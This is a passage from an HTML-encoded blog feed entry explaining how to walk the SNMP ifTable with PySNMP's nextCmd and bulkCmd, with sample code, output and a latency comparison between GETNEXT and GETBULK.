  &lt;li&gt;In packet 4, instead of returning the value of OID 1.3.6.1.2.1.2.2.1.1.1 it is returning the &lt;strong&gt;next&lt;/strong&gt; value of 1.3.6.1.2.1.2.2.1.1.2 which when translated is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IF-MIB::ifIndex.2 = 2&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Details of packet 2, the first SNMP GETNEXT response, can be seen in the below screenshot. Looking at the variable-bindings, you can see that there is no binding for the OID of 1.3.6.1.2.1.2.2 (ifTable), but instead a single binding of the next variable in the MIB tree; 1.3.6.1.2.1.2.2.1.1.1 (ifIndex.1).&lt;/p&gt;

&lt;figure class=&quot;align-center&quot;&gt;
  &lt;img src=&quot;http://localhost:4000/assets/images/wshark-snmp-resp-detail-1.png&quot; alt=&quot;wireshark-captured-snmp-next-packet-details&quot; /&gt;
  &lt;figcaption&gt;SNMP GETNEXT response packet details.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;To perform an SNMP GETNEXT query with PySNMP and walk an the ifTable, we build our command generator using nextCmd() as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nextCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;IF-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ifTable&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lexicographicMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The majority of the code above has been well explained in my &lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;PySNMP HLAPI&lt;/a&gt; post and are very similar to that of the getCmd() command. The two differences are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We’re now using nextCmd() instead of getCmd()&lt;/li&gt;
  &lt;li&gt;An option of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lexicographicMod=False&lt;/code&gt; is included&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lexicographicMode=False&lt;/code&gt; is an option that by default is True. What this means is that by default (value=True) we can use the command generator with next() to query from the particular ObjectIdentity that we provided all the way until the end of the MIB. When the end of the MIB is reached a PySNMP StopIteration exception is thrown which we can catch with a try/except clause. When we provide a value of False, this means that PySNMP will return values only within the current heirarchy of what we initially requested. In the example code above, with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lexicographicMode=False&lt;/code&gt;, we only want to query descendants of ifTable and nothing outside of that tree thats further below in the MIB.&lt;/p&gt;

&lt;p&gt;To walk the entire ifTable using the nextCmd() command generator shown above, we can loop over the command generator until the StopIteration exception is thrown:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MAX_REPS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_REPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;StopIteration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice--warning&quot;&gt;I previously wrote the above while() look at a while(True) loop, which probably isn’t great. This can result in an infinite loop if the logic within the loop doesn’t have a guaranteed break-away. This would normally be the StopIteration exception being seen, but I have now written a fail-safe with an arbitrarily set MAX_REPS value of 500 and a count variable that increments after each loop.&lt;/p&gt;

&lt;p&gt;Running the above code will result in all varBind variables being printed to screen. It is within this while() loop that you would perform additional handling of the SNMP responses such as storing them in a database, writing them to file, taking action based a response, etc. Running the code above will generate a large number of printed statements showing the entire ifTable contents:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IF-MIB::ifIndex.1 = 1
IF-MIB::ifIndex.2 = 2
IF-MIB::ifIndex.3 = 3
IF-MIB::ifIndex.4 = 4
IF-MIB::ifIndex.5 = 5
IF-MIB::ifDescr.1 = GigabitEthernet0/0
IF-MIB::ifDescr.2 = GigabitEthernet0/1
IF-MIB::ifDescr.3 = GigabitEthernet0/2
IF-MIB::ifDescr.4 = GigabitEthernet0/3
IF-MIB::ifDescr.5 = Null0
IF-MIB::ifType.1 = ethernetCsmacd
IF-MIB::ifType.2 = ethernetCsmacd
IF-MIB::ifType.3 = ethernetCsmacd
IF-MIB::ifType.4 = ethernetCsmacd
IF-MIB::ifType.5 = other
IF-MIB::ifMtu.1 = 1500
IF-MIB::ifMtu.2 = 1500
IF-MIB::ifMtu.3 = 1500
IF-MIB::ifMtu.4 = 1500
IF-MIB::ifMtu.5 = 1500
IF-MIB::ifSpeed.1 = 1000000000
IF-MIB::ifSpeed.2 = 1000000000
IF-MIB::ifSpeed.3 = 1000000000
IF-MIB::ifSpeed.4 = 1000000000
IF-MIB::ifSpeed.5 = 4294967295
IF-MIB::ifPhysAddress.1 = 52:54:00:17:10:3e
IF-MIB::ifPhysAddress.2 = 52:54:00:17:0b:b4
IF-MIB::ifPhysAddress.3 = 52:54:00:09:5f:73
IF-MIB::ifPhysAddress.4 = 52:54:00:04:4d:73
IF-MIB::ifPhysAddress.5 =
IF-MIB::ifAdminStatus.1 = up
IF-MIB::ifAdminStatus.2 = down
IF-MIB::ifAdminStatus.3 = down
IF-MIB::ifAdminStatus.4 = down
IF-MIB::ifAdminStatus.5 = up
IF-MIB::ifOperStatus.1 = up
IF-MIB::ifOperStatus.2 = down
IF-MIB::ifOperStatus.3 = down
IF-MIB::ifOperStatus.4 = down
IF-MIB::ifOperStatus.5 = up
IF-MIB::ifLastChange.1 = 2633
IF-MIB::ifLastChange.2 = 3010
IF-MIB::ifLastChange.3 = 3032
IF-MIB::ifLastChange.4 = 3032
IF-MIB::ifLastChange.5 = 0
IF-MIB::ifInOctets.1 = 114294
IF-MIB::ifInOctets.2 = 0
IF-MIB::ifInOctets.3 = 0
IF-MIB::ifInOctets.4 = 0
IF-MIB::ifInOctets.5 = 0
IF-MIB::ifInUcastPkts.1 = 1266
IF-MIB::ifInUcastPkts.2 = 0
IF-MIB::ifInUcastPkts.3 = 0
IF-MIB::ifInUcastPkts.4 = 0
IF-MIB::ifInUcastPkts.5 = 0
IF-MIB::ifInDiscards.1 = 0
IF-MIB::ifInDiscards.2 = 0
IF-MIB::ifInDiscards.3 = 0
IF-MIB::ifInDiscards.4 = 0
IF-MIB::ifInDiscards.5 = 0
IF-MIB::ifInErrors.1 = 0
IF-MIB::ifInErrors.2 = 0
IF-MIB::ifInErrors.3 = 0
IF-MIB::ifInErrors.4 = 0
IF-MIB::ifInErrors.5 = 0
IF-MIB::ifInUnknownProtos.1 = 0
IF-MIB::ifInUnknownProtos.2 = 0
IF-MIB::ifInUnknownProtos.3 = 0
IF-MIB::ifInUnknownProtos.4 = 0
IF-MIB::ifInUnknownProtos.5 = 0
IF-MIB::ifOutOctets.1 = 9820093
IF-MIB::ifOutOctets.2 = 0
IF-MIB::ifOutOctets.3 = 0
IF-MIB::ifOutOctets.4 = 0
IF-MIB::ifOutOctets.5 = 0
IF-MIB::ifOutUcastPkts.1 = 84803
IF-MIB::ifOutUcastPkts.2 = 0
IF-MIB::ifOutUcastPkts.3 = 0
IF-MIB::ifOutUcastPkts.4 = 0
IF-MIB::ifOutUcastPkts.5 = 0
IF-MIB::ifOutDiscards.1 = 0
IF-MIB::ifOutDiscards.2 = 0
IF-MIB::ifOutDiscards.3 = 0
IF-MIB::ifOutDiscards.4 = 0
IF-MIB::ifOutDiscards.5 = 0
IF-MIB::ifOutErrors.1 = 0
IF-MIB::ifOutErrors.2 = 0
IF-MIB::ifOutErrors.3 = 0
IF-MIB::ifOutErrors.4 = 0
IF-MIB::ifOutErrors.5 = 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;snmp-getbulk-requests-with-pysnmp-bulkcmd&quot;&gt;SNMP GETBULK Requests with PySNMP bulkCmd()&lt;/h2&gt;

&lt;p&gt;A negative factor when sending SNMP GETNEXT requests is that each MIB variable requires both a request and response packet. When there is a moderate amount of network latency between an SNMP manager and SNMP agent, this can result in unecessary latency. In the ifTable example in the above section, this requires 90 request and 90 response packets and in my local area network (LAN) it took 1.29 seconds to retrieve the entire table.&lt;/p&gt;

&lt;p&gt;Another SNMP query method is a GETBULK query which is implemnented with PySNMP’s bulkCmd() method. SNMP GETBULK queries allow you to request multiple GETNEXT variable bindings in a response packet. For example, issuing a GETBULK with the appropriate parameters can allow you to return the entire ifTable in only a few packets.&lt;/p&gt;

&lt;p&gt;There are two important parameters that are required when issuing a GETBULK request:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Non-repeaters&lt;/li&gt;
  &lt;li&gt;Max-repetitions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The detailed explanation of how these variables is used in processing an SNMP GETBULK request by an SNMP agent is outlined in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc1905.html#section-4.2.3&quot;&gt;RFC1905 section 4.2.3&lt;/a&gt;. For our example of querying a table of data, such as ifTable, we’re going to keep non-repeaters value as 0 and we will set max-repetitions to the number of variable-bindings we want returned per request. We will be setting max-reptitions to 50. This means that out of the 90 variable-binds we saw in the GETNEXT section above, we should expect two SNMP responses.&lt;/p&gt;

&lt;p&gt;The below screenshot shows capturing the entire ifTable in two requests and two responses and that this is accomplished in 0.087 seconds. This is significantly quicker than issuing multiple GETNEXT requests, which took 1.29 seconds for all 90 of them.&lt;/p&gt;

&lt;figure class=&quot;align-center&quot;&gt;
  &lt;img src=&quot;http://localhost:4000/assets/images/wshark-snmp-packet-2.png&quot; alt=&quot;wireshark-captured-snmp-bulk-packets&quot; /&gt;
  &lt;figcaption&gt;SNMP GETBULK packet behavior.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Looking at the details of packet 2 in the below screenshot (the first SNMP response packet) you can see that 50 items are included in the variable-bindings section of the packet.&lt;/p&gt;

&lt;figure class=&quot;align-center&quot;&gt;
  &lt;img src=&quot;http://localhost:4000/assets/images/wshark-snmp-getbulk-resp-detail-1.png&quot; alt=&quot;wireshark-captured-snmp-bulk-packet-details&quot; /&gt;
  &lt;figcaption&gt;SNMP GETBULK response packet details.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;An interesting aspect of setting the max-repetitions value to 50 is that the second SNMP response packet had 50 variable-bindings in it instead of the 40 that we would have expected (50 variable-bindings from the first response packet and 40 additional ones to represent the ifTable that we already know should be 90 variable-bindings in total). The SNMP agent on the remote device doesn’t know that we are only looking for the contents of the ifTable, so instead it grabs the next 10 variable-bindings found after the ifTable within IF-MIB. Thankfully, with PySNMP’s lexicographicMode option set to False, these remaining 10 values are ignored when reading the results of varBind.&lt;/p&gt;

&lt;p&gt;To issue an SNMP GETBULK request with PySNMP we use the bulkCmd() command generator. The two integers below the ContextData() parameter are integers representing the non-repeaters (a value of 0) and max-repetitions (avalue of 50). Following these values we can continue providing the ObjectType() variables we want to query:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bulkCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;IF-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ifTable&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lexicographicMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Although all variable-bindings were returned in only two packets, we must still parse over all 90 of these using the command generator &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next(iterator)&lt;/code&gt;. How this works is that the first iteration sends the first GETBULK command and the resulting response packet with 50 variable-bindings. The 51st iteration sends the second GETBULK command and the response packet contains the remainder of the variable-bindings (and the 10 discarded variable-bindings at the end we don’t care about). This can be accomplished using the same method we saw in the nextCmd() section:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MAX_REPS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_REPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;StopIteration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When viewing the printed data you can see that the count variable only incremented to 90. So although there were a total of 100 variable-bindings across the two packets, the 10 which we didn’t care about we don’t iterate over. This is a direct result of setting lexicographicMode to False and exception StopIteration being raised, which stops the while loop:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifOutErrors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifOutErrors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifOutErrors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifOutErrors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifOutErrors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;where-to-go-next&quot;&gt;Where to go next?&lt;/h2&gt;

&lt;p&gt;This article has covered how to walk SNMP tables and the performance benefit of using PySNMP’s getBulk() method to reduce query latency. In this particular case going from 1.29 seconds when using GETNEXT requests to 0.087 seconds with GETBULK requests may not seem like much when querying a single device, but when doing this at across hundreds of devices there is a huge benefit. SNMP tables are found across many different MIB’s. Exploring which platform types are in use in your network, what standard or vendor/proprietary MIB’s are available should help point you in the right direction for when to use an SNMP GET, GETNEXT, or GETBULK command!&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><category term="SNMP" /><summary type="html">Up until now my articles (PySNMP HLAPI, Compiling MIB’s for PySNMP) have focused on using simple SNMP GET requests with PySNMP’s getCmd. This works great for simple SNMP queries where you only need one piece of information. When performing gathering of larger data sets with SNMP, issuing single SNMP GET requests for each data point can be very inefficient. Often times you are limited by the latency that exists between the SNMP manager (your script/code) and the SNMP agent running on a network device. In this article we will explore PySNMP’s implementation of SNMP GET NEXT and GET BULK using the nextCmd and bulkCmd command generators and how to retrieve the ifTable table of data from an SNMP 